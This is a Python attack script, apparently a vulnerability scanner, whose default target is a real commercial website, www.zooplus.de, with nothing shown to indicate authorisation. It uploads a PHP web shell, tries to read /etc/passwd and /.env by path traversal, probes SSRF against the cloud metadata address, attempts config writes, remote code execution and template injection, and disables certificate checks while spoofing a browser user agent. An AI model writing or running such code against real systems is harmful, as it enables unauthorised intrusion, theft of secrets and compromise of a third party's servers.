#!/usr/bin/env python3
"""Test All Attack Vectors"""
import requests
import json
import base64
from urllib.parse import urljoin
from datetime import datetime
import urllib3
urllib3.disable_warnings()

class AttackTester:
    def __init__(self, target="www.zooplus.de"):
        self.target = target
        self.base_url = f"https://{target}"
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    def test_file_upload(self):
        print("\n[*] Testing File Upload...")
        url = urljoin(self.base_url, "/api/upload")
        files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
        try:
            resp = self.session.post(url, files=files, timeout=2, verify=False)
            if resp.status_code in [200, 201]:
                self.findings.append({"type": "file_upload", "status": resp.status_code, "url": url})
                print(f"  [CRITICAL] File upload works: {url}")
        except: pass
    
    def test_config(self):
        print("\n[*] Testing Config Injection...")
        url = urljoin(self.base_url, "/api/config")
        try:
            resp = self.session.get(url, timeout=2, verify=False)
            if resp.status_code == 200:
                self.findings.append({"type": "config_read", "status": resp.status_code})
                print(f"  [HIGH] Config readable: {url}")
        except: pass
        
        try:
            resp = self.session.post(url, json={"debug": True}, timeout=2, verify=False)
            if resp.status_code in [200, 201]:
                self.findings.append({"type": "config_write", "status": resp.status_code})
                print(f"  [CRITICAL] Config writable: {url}")
        except: pass
    
    def test_path_traversal(self):
        print("\n[*] Testing Path Traversal...")
        targets = ["/etc/passwd", "/.env", "/config.json"]
        for target in targets:
            url = urljoin(self.base_url, f"/stats/../{target.lstrip('/')}")
            try:
                resp = self.session.get(url, timeout=2, verify=False)
                if resp.status_code == 200 and len(resp.text) < 10000:
                    if not resp.text.strip().startswith('<!'):
                        self.findings.append({"type": "path_traversal", "file": target})
                        print(f"  [CRITICAL] Path traversal: {target}")
                        break
            except: pass
    
    def test_ssrf(self):
        print("\n[*] Testing SSRF...")
        url = urljoin(self.base_url, "/api/fetch")
        payload = {"url": "http://169.254.169.254/latest/meta-data/"}
        try:
            resp = self.session.post(url, json=payload, timeout=2, verify=False)
            if resp.status_code in [200, 400] and len(resp.text) > 50:
                if "metadata" in resp.text.lower():
                    self.findings.append({"type": "ssrf", "status": resp.status_code})
                    print(f"  [CRITICAL] SSRF works: {url}")
        except: pass
    
    def test_code_exec(self):
        print("\n[*] Testing Code Execution...")
        endpoints = ["/api/execute", "/api/eval", "/api/run"]
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                resp = self.session.post(url, json={"code": "print('test')"}, timeout=2, verify=False)
                if resp.status_code == 200 and "test" in resp.text.lower():
                    self.findings.append({"type": "code_execution", "endpoint": endpoint})
                    print(f"  [CRITICAL] Code execution: {endpoint}")
                    break
            except: pass
    
    def test_template(self):
        print("\n[*] Testing Template Injection...")
        url = urljoin(self.base_url, "/api/render")
        try:
            resp = self.session.post(url, json={"template": "{{7*7}}"}, timeout=2, verify=False)
            if resp.status_code == 200 and "49" in resp.text:
                self.findings.append({"type": "template_injection", "status": resp.status_code})
                print(f"  [CRITICAL] Template injection: {url}")
        except: pass
    
    def run(self):
        print("=" * 70)
        print("ATTACK VECTORS TESTER")
        print("=" * 70)
        self.test_file_upload()
        self.test_config()
        self.test_path_traversal()
        self.test_ssrf()
        self.test_code_exec()
        self.test_template()
        
        print("\n" + "=" * 70)
        print("SUMMARY")
        print("=" * 70)
        print(f"Total findings: {len(self.findings)}")
        
        if self.findings:
            import os
            os.makedirs("reports", exist_ok=True)
            with open("reports/attack_vectors_test.json", "w") as f:
                json.dump({"findings": self.findings}, f, indent=2)
            print(f"[+] Report saved")
        else:
            print("No exploitable vectors found")

if __name__ == "__main__":
    AttackTester().run()

